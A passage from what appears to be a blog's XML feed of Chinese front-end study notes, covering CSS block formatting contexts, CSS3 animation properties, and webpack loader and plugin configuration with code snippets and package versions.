table、row、tbody、thead、tfoot 的默认属性）或 <code>inline-table</code>）</li><li><code>overflow</code> 计算值(Computed)不为 <code>visible</code> 的块元素</li><li><code>display</code>值为 <code>flow-root</code> 的元素</li><li><code>contain</code> 值为 <code>layout</code>、<code>content </code>或 <code>paint</code> 的元素</li><li>弹性元素（<code>display</code> 为 <code>flex</code> 或 <code>inline-flex </code>元素的直接子元素）</li><li>网格元素（<code>display</code>为 <code>grid</code> 或 <code>inline-grid</code> 元素的直接子元素）</li><li>多列容器（元素的 <code>column-count</code> 或 <code>column-width</code> (en-US)不为 <code>auto，包括 ``column-count</code> 为 <code>1</code>）</li><li><code>column-span</code> 为 <code>all</code> 的元素始终会创建一个新的BFC，即使该元素没有包裹在一个多列容器中（标准变更，Chrome bug）。</li></ul><p>块格式化上下文包含创建它的元素内部的所有内容.</p></blockquote><h4 id="4.bfc-特性及其应用">4.BFC 特性及其应用<a title="#4.bfc-特性及其应用" href="#4.bfc-特性及其应用"></a></h4><ul><li><p>同一个  BFC 下外边距会发生折叠</p><blockquote><p>解决外边距塌陷：将其放在不同的 BFC 容器中</p></blockquote></li><li><p>BFC 可以包含浮动的元素</p><blockquote><p>清除浮动：父元素触发 BFC</p></blockquote></li><li><p>BFC 可以阻止元素被浮动元素覆盖</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS3 animate</title>
      <link href="/learningNotes/further/animate%20%E5%8A%A8%E7%94%BB"/>
      <url>/learningNotes/further/animate%20%E5%8A%A8%E7%94%BB</url>
      
        <content type="html"><![CDATA[<h2 id="css3-animate">CSS3 animate<a title="#css3-animate" href="#css3-animate"></a></h2><p><strong>CSS animations</strong> 使得可以将从一个CSS样式配置转换到另一个CSS样式配置。动画包括两个部分:描述动画的样式规则和用于指定动画开始、结束以及中间点样式的关键帧。</p><h4 id="制作动画">制作动画<a title="#制作动画" href="#制作动画"></a></h4><ol><li><p>定义动画</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframs</span> myanimate&#123;</span><br><span class="line">    <span class="number">0%</span>&#123;&#125;</span><br><span class="line">    <span class="number">100%</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用动画</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">animation</span>:name duration timing-function delay iteration-count direction fill-mode;</span><br><span class="line">  <span class="comment">/*动画名 持续时间 运动曲线 何时开始 播放次数 是否反方向 动画起始或者结束的状态*/</span></span><br><span class="line">    <span class="comment">/* 简写不包括 play-state 运行还是暂停 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="常见属性">常见属性<a title="#常见属性" href="#常见属性"></a></h4><div class="φbq"><div class="φbs"><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>@keyframes</td><td>规定动画</td></tr><tr><td>animation</td><td>所有动画的简写属性，除了animation-play-state属性</td></tr><tr><td>animation-name</td><td>规定@keyframes动画的名称（必须）</td></tr><tr><td>animation-duration</td><td>规定动画完成一个周期所花费的秒或毫秒，默认为0（必须）</td></tr><tr><td>animation-timing-function</td><td>规定动画是的速度曲线，默认为ease</td></tr><tr><td>animation-delay</td><td>规定动画合适开始，默认是0</td></tr><tr><td>animation-iteration-count</td><td>规定动画播放的次数，默认1，还有ifinite（无限）</td></tr><tr><td>animation——direction</td><td>规定动画是否在下一周逆向播放，默认为normal，逆播放alternate</td></tr><tr><td>animation-play-state</td><td>规定动画是否正在运行或停止，默认running 还有paused</td></tr><tr><td>animation-fill-mode</td><td>规定动画结束后状态，保持forwards回到起始backwards</td></tr></tbody></table></div></div><h4 id="总结：">总结：<a title="#总结：" href="#总结："></a></h4><p>简写属性不包括animation-play-state<br>暂停动画：animation-play-state：puased；经常和鼠标经过等其他配合使用<br>想要动画走回来，而不是直接跳回来：animation-direction：alternate；<br>盒子动画结束后，停在结束位置：animation-fill-mode：forwards；</p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack 学习笔记</title>
      <link href="/learningNotes/webpack"/>
      <url>/learningNotes/webpack</url>
      
        <content type="html"><![CDATA[<h2 id="0.-atguigu-视频-的第三方包的版本">0. atguigu 视频 的第三方包的版本<a title="#0.-atguigu-视频-的第三方包的版本" href="#0.-atguigu-视频-的第三方包的版本"></a></h2><h4 id="0.1-创建项目-初始化项目">0.1 创建项目 初始化项目<a title="#0.1-创建项目-初始化项目" href="#0.1-创建项目-初始化项目"></a></h4><p>npm init</p><h4 id="0.2-包版本">0.2 包版本<a title="#0.2-包版本" href="#0.2-包版本"></a></h4><h5 id="全局安装--g-和-本地安装--d-:">全局安装 -g 和 本地安装 -D :<a title="#全局安装--g-和-本地安装--d-:" href="#全局安装--g-和-本地安装--d-:"></a></h5><ul><li><p>webpack@4.41.6           我下的—5.52.1</p></li><li><p>webpack-cli@3.3.11                 —4.8.0</p></li></ul><h5 id="loader-和一些-pulgin-插件：">loader 和一些 pulgin 插件：<a title="#loader-和一些-pulgin-插件：" href="#loader-和一些-pulgin-插件："></a></h5><h6 id="1.-处理css：">1. 处理css：<a title="#1.-处理css：" href="#1.-处理css："></a></h6><p>css-loader@3.4.2   —6.2.0</p><p>style-loader@1.1.3  —3.2.1</p><h6 id="2.-处理less">2. 处理less<a title="#2.-处理less" href="#2.-处理less"></a></h6><p>less-loader@5.0.0   —10.0.1</p><p>less@3.11.1  —4.1.1</p><h6 id="3.-处理html">3. 处理html<a title="#3.-处理html" href="#3.-处理html"></a></h6><p>html-webpack-plugin@3.2.0   —5.3.2</p><h6 id="4.-处理img">4. 处理img<a title="#4.-处理img" href="#4.-处理img"></a></h6><p>url-loader@3.0.0   —4.1.1</p><p>file-loader@5.0.2   —6.2.0</p><h6 id="5.-处理html-img">5. 处理html img<a title="#5.-处理html-img" href="#5.-处理html-img"></a></h6><p>html-loader@0.5.5   —2.1.2</p><h6 id="6.-devserver">6. devServer<a title="#6.-devserver" href="#6.-devserver"></a></h6><p>webpack-dev-server@3.10.3   —4.2.0</p><h6 id="7.-分离css">7. 分离css<a title="#7.-分离css" href="#7.-分离css"></a></h6><p>mini-css-extract-plugin@0.9.0</p><h6 id="8.-css兼容">8. css兼容<a title="#8.-css兼容" href="#8.-css兼容"></a></h6><p>postcss-roader@3.0.0</p><p>postcss-preset-env@6.7.0</p><h6 id="9.-css压缩">9. css压缩<a title="#9.-css压缩" href="#9.-css压缩"></a></h6><p>optimize-css-assets-webpack-plugin@5.0.3</p><h6 id="10.-js兼容">10. js兼容<a title="#10.-js兼容" href="#10.-js兼容"></a></h6><p>babel-roader@8.0.6</p><p>@babel-preset-env@7.4.8</p><p>@babel/core@7.8.4</p><p>@babel-polyfill@7.8.3</p><p>core-js@3.6.4</p><h6 id="11.-pwa">11. pwa<a title="#11.-pwa" href="#11.-pwa"></a></h6><p>workbox-webpack-plugin@5.0.0</p><p>serve@11.3.0</p><h6 id="12.-多进程">12. 多进程<a title="#12.-多进程" href="#12.-多进程"></a></h6><p>thread-roader@2.1.3</p><h6 id="13.-dll">13. dll<a title="#13.-dll" href="#13.-dll"></a></h6><p>add-asset-html-webpack-plugin@3.1.3</p><p>terser-webpack-plugin@2.3.5</p><h2 id="1.webpack-开发环境配置">1.webpack 开发环境配置<a title="#1.webpack-开发环境配置" href="#1.webpack-开发环境配置"></a></h2><h3 id="1.1-基本配置">1.1 基本配置<a title="#1.1-基本配置" href="#1.1-基本配置"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// 入口起点</span></span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/js/index.js&#x27;</span>,</span><br><span class="line">  <span class="comment">// 输出</span></span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&#x27;bulit.js&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;build&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// loader配置</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// 详细loader配置</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// plugins插件的配置</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line"></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span>,</span><br><span class="line">  <span class="comment">// mode: &#x27;production&#x27;,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1.2-loader的配置">1.2 loader的配置<a title="#1.2-loader的配置" href="#1.2-loader的配置"></a></h3><h4 id="1.2.1-css">1.2.1 css<a title="#1.2.1-css" href="#1.2.1-css"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置css</span></span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">// 匹配了哪些文件</span></span><br><span class="line">       <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">       <span class="comment">// 使用了哪些loader进行处理</span></span><br><span class="line">       <span class="attr">use</span>: [</span><br><span class="line">         <span class="comment">// use数组中 loader的执行顺序:从右到左  从下到上</span></span><br><span class="line">         <span class="comment">// 创建 style 标签，将js中的样式资源插入到head中</span></span><br><span class="line">         <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">         <span class="comment">// 将css文件变化 commonjs 模块加载到js中 里面的内容样式是字符串</span></span><br><span class="line">         <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">       ]</span><br><span class="line">     &#125;,</span><br></pre></td></tr></table></figure><h4 id="1.2.2-less">1.2.2 less<a title="#1.2.2-less" href="#1.2.2-less"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//配置less 要加上上面配置的css</span></span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">test</span>: <span class="regexp">/.\less$/</span>,</span><br><span class="line">       <span class="comment">// 最后一个 将less 编译成css 文件 </span></span><br><span class="line">       <span class="comment">// 需要下载 less-loader less</span></span><br><span class="line">       <span class="attr">use</span>: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>, <span class="string">&#x27;less-loader&#x27;</span>]</span><br><span class="line">     &#125;,</span><br></pre></td></tr></table></figure><h4 id="1.2.3-图片">1.2.3 图片<a title="#1.2.3-图片" href="#1.2.3-图片"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//配置图片资源  默认处理不了 html 中的img</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">test</span>: <span class="regexp">/\.(jpg|png|gif|jpeg)$/</span>,</span><br><span class="line">          <span class="comment">// 使用一个loader时 可以直接用下面这种方法</span></span><br><span class="line">          <span class="comment">// 下载 url-loader file-loader-&gt; 不用下载</span></span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">          <span class="attr">options</span>: &#123;</span><br><span class="line">            <span class="attr">publicPath</span>: <span class="string">&#x27;./img&#x27;</span>,</span><br><span class="line">            <span class="attr">outputPath</span>: <span class="string">&#x27;img&#x27;</span>,</span><br><span class="line">            <span class="comment">// 图片大小小于 8kb 就会被base64 处理</span></span><br><span class="line">            <span class="comment">// 优点：减少请求数量  减轻服务器压力</span></span><br><span class="line">            <span class="comment">// 缺点：图片体积会更大 文件请求速度更慢</span></span><br><span class="line">            <span class="attr">limit</span>: <span class="number">8</span> * <span class="number">1024</span>,</span><br><span class="line">            <span class="comment">// fallback: resolve(&#x27;file-roader&#x27;),</span></span><br><span class="line">            <span class="comment">// 对图片进行重命名</span></span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;img/[name][hash:10].[ext]&#x27;</span>,</span><br><span class="line">            <span class="comment">// 因为url-loader 默认 es6 模块化解析 而html-loader引入图片是commonjs</span></span><br><span class="line">            <span class="comment">// 解析时 会出现 [object Module]</span></span><br><span class="line">            <span class="comment">// 关闭 url-loader 的es6 模块化 使用 commonjs</span></span><br><span class="line">            <span class="attr">esModule</span>: <span class="literal">false</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        <span class="comment">//或者</span></span><br><span class="line">        <span class="comment">// use: &#123;</span></span><br><span class="line">        <span class="comment">//   loader: &#x27;url-loader&#x27;,</span></span><br><span class="line">        <span class="comment">//   options: &#123;</span></span><br><span class="line">        <span class="comment">//     publicPath: &#x27;./img&#x27;,</span></span><br><span class="line">        <span class="comment">//     outputPath: &#x27;img/&#x27;,</span></span><br><span class="line">        <span class="comment">//     limit: 8192,</span></span><br><span class="line">        <span class="comment">//     esModule: false</span></span><br><span class="line">        <span class="comment">//   &#125;</span></span><br><span class="line">        <span class="comment">// &#125;,</span></span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;javascript/auto&#x27;</span>,   <span class="comment">//必要</span></span><br></pre></td></tr></table></figure><h4 id="1.2.4-html中的图片">1.2.4 html中的图片<a title="#1.2.4-html中的图片" href="#1.2.4-html中的图片"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在上面图片配置的基础上</span></span><br><span class="line"> <span class="comment">//处理 html 的img</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.html$/</span>,</span><br><span class="line">        <span class="comment">// 引入 img 从而被 url-loader处理</span></span><br><span class="line">        <span class="attr">loader</span>: <span class="string">&#x27;html-loader&#x27;</span>,</span><br><span class="line">        <span class="attr">options</span>: &#123;</span><br><span class="line">          <span class="attr">esModule</span>: <span class="literal">false</span>,</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="1.2.5-html">1.2.5 html<a title="#1.2.5-html" href="#1.2.5-html"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//plugins : 下载 -&gt; 导入 -&gt; 使用</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"><span class="comment">// plugins插件的配置</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// html-webpack-plugin</span></span><br><span class="line">    <span class="comment">// if 直接 new...() 会创建一个空的html 自动引入打包输出的所有资源</span></span><br><span class="line">    <span class="comment">// if new...(&#123; template:&#x27;url&#x27;&#125;) 会有路径中的文件的结果</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">template</span>: <span class="string">&#x27;./src/index.html&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br></pre></td></tr></table></figure><h4 id="1.2.6-热部署">1.2.6 热部署<a title="#1.2.6-热部署" href="#1.2.6-热部署"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最新 webpack-cil 于这个不匹配</span></span><br><span class="line"><span class="comment">// 开发服务器 devServer 用来自动化 自动编译 打开浏览器 刷新</span></span><br><span class="line"><span class="comment">// 特点 只会在内存中编译打包 不会有任何输出</span></span><br><span class="line"><span class="comment">// 启动 npx webpack-dev-server  </span></span><br><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">  <span class="comment">// 项目构建后目录</span></span><br><span class="line">  <span class="attr">contentBase</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">  <span class="comment">// 启动gzip压缩</span></span><br><span class="line">  <span class="attr">compress</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// 端口号</span></span><br><span class="line">  <span class="attr">port</span>: <span class="number">3000</span>,</span><br><span class="line">  <span class="comment">// 自动打开浏览器</span></span><br><span class="line">  <span class="attr">open</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2.webpack-开发环境依赖">2.webpack 开发环境依赖<a title="#2.webpack-开发环境依赖" href="#2.webpack-开发环境依赖"></a></h2><h3 id="2.1-提取css-成单独文件">2.1 提取css 成单独文件<a title="#2.1-提取css-成单独文件" href="#2.1-提取css-成单独文件"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MiniCssExtractPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;mini-css-extract-plugin&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; </span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&#x27;./src/js/index.js&#x27;</span>, </span><br><span class="line">    <span class="attr">output</span>: &#123; </span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;js/built.js&#x27;</span>, </span><br><span class="line">        <span class="attr">path</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;build&#x27;</span>) </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">module</span>: &#123; </span><br><span class="line">        <span class="attr">rules</span>: [ &#123; </span><br><span class="line">            <span class="attr">test</span>: <span class="regexp">/\.css$/</span>, </span><br><span class="line">            <span class="attr">use</span>: [ </span><br><span class="line">                <span class="comment">// 创建 style 标签，将样式放入 </span></span><br><span class="line">                <span class="comment">// &#x27;style-loader&#x27;, </span></span><br><span class="line">                <span class="comment">// 这个 loader 取代 style-loader。作用：提取js中的css成单独文件 MiniCssExtractPlugin.loader, </span></span><br><span class="line">                <span class="comment">// 将 css 文件整合到 js 文件中 </span></span><br><span class="line">                <span class="string">&#x27;css-loader&#x27;</span> ] </span><br><span class="line">        &#125; ] </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">plugins</span>: [ </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123; </span><br><span class="line">            <span class="attr">template</span>: <span class="string">&#x27;./src/index.html&#x27;</span> </span><br><span class="line">        &#125;), </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MiniCssExtractPlugin</span>(&#123; </span><br><span class="line">            <span class="comment">// 对输出的 css 文件进行重命名 </span></span><br><span class="line">            <span class="attr">filename</span>: <span class="string">&#x27;css/built.css&#x27;</span> </span><br><span class="line">        &#125;) </span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2.2-css兼容">2.2 css兼容<a title="#2.2-css兼容" href="#2.2-css兼容"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js</span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="attr">test</span>: <span class="regexp">/\.css$/</span>, </span><br><span class="line">        <span class="attr">use</span>: [ </span><br><span class="line">            <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>, </span><br><span class="line">            <span class="string">&#x27;css-loader&#x27;</span>, </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="attr">loader</span>: <span class="string">&#x27;postcss-loader&#x27;</span>, </span><br><span class="line">                <span class="attr">options</span>: &#123; </span><br><span class="line">                    <span class="attr">ident</span>: <span class="string">&#x27;postcss&#x27;</span>, </span><br><span class="line">                    <span class="attr">plugins</span>: <span class="function">() =&gt;</span> [ </span><br><span class="line">                        <span class="comment">// postcss 的插件 </span></span><br><span class="line">                        <span class="built_in">require</span>(<span class="string">&#x27;postcss-preset-env&#x27;</span>)() </span><br><span class="line">                    ] </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">plugins</span>: [ </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123; <span class="attr">template</span>: <span class="string">&#x27;./src/index.html&#x27;</span> &#125;), </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">MiniCssExtractPlugin</span>(&#123; </span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;css/built.css&#x27;</span> </span><br><span class="line">    &#125;) </span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package.js</span></span><br><span class="line"><span class="string">&quot;browserslist&quot;</span>: &#123; </span><br><span class="line">    <span class="string">&quot;development&quot;</span>: [ </span><br><span class="line">        <span class="string">&quot;last 1 chrome version&quot;</span>, </span><br><span class="line">        <span class="string">&quot;last 1 firefox version&quot;</span>, </span><br><span class="line">        <span class="string">&quot;last 1 safari version&quot;</span> </span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;production&quot;</span>: [ </span><br><span class="line">        <span class="string">&quot;&gt;0.2%&quot;</span>, </span><br><span class="line">        <span class="string">&quot;not dead&quot;</span>, </span><br><span class="line">        <span class="string">&quot;not op_mini all&quot;</span> </span><br><span class="line">    ] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2.3-css压缩">2.3 css压缩<a title="#2.3-css压缩" href="#2.3-css压缩"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line">    ... <span class="comment">//同上</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">OptimizeCssAssetsWebpackPlugin</span>() </span><br><span class="line">],</span><br></pre></td></tr></table></figure><h3 id="2.4-js语法检查-eslint">2.4 js语法检查 eslint<a title="#2.4-js语法检查-eslint" href="#2.4-js语法检查-eslint"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rules</span>: [ </span><br><span class="line">    <span class="comment">/*语法检查： eslint-loader eslint </span></span><br><span class="line"><span class="comment">    注意：只检查自己写的源代码，第三方的库是不用检查的 </span></span><br><span class="line"><span class="comment">    设置检查规则： package.json 中 eslintConfig 中设置~ </span></span><br><span class="line"><span class="comment">    &quot;eslintConfig&quot;: &#123; &quot;extends&quot;: &quot;airbnb-base&quot; &#125; </span></span><br><span class="line"><span class="comment">    airbnb --&gt; eslint-config-airbnb-base eslint-plugin-import eslint </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    &#123; </span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.js$/</span>, </span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>, </span><br><span class="line">        <span class="attr">loader</span>: <span class="string">&#x27;eslint-loader&#x27;</span>, </span><br><span class="line">        <span class="attr">options</span>: &#123; </span><br><span class="line">            <span class="comment">// 自动修复 eslint 的错误 </span></span><br><span class="line">            <span class="attr">fix</span>: <span class="literal">true</span> </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package.json</span></span><br><span class="line"><span class="string">&quot;eslintConfig&quot;</span>: &#123; </span><br><span class="line">    <span class="string">&quot;extends&quot;</span>: <span class="string">&quot;airbnb-base&quot;</span>,</span><br><span class="line">     <span class="string">&quot;env&quot;</span>: &#123; </span><br><span class="line">         <span class="string">&quot;browser&quot;</span>: <span class="literal">true</span> </span><br><span class="line">     &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2.5-js兼容">2.5 js兼容<a title="#2.5-js兼容" href="#2.5-js兼容"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 